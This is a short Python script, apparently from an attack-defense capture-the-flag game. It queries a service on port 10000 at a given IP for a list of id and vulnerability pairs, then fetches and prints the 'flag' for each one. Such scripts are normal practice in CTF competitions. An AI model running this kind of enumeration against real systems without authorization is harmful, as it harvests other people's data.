import sys
import time

import requests

ip = sys.argv[1]

resp = requests.get(f"http://{ip}:10000/list")

flags_mas = []
for item in resp.json():
    args = item.split(':')
    flag = requests.get(f"http://{ip}:10000/get/?id={args[1]}&vuln={args[0]}").json()["flag"]
    flags_mas.append(flag)
print(flags_mas)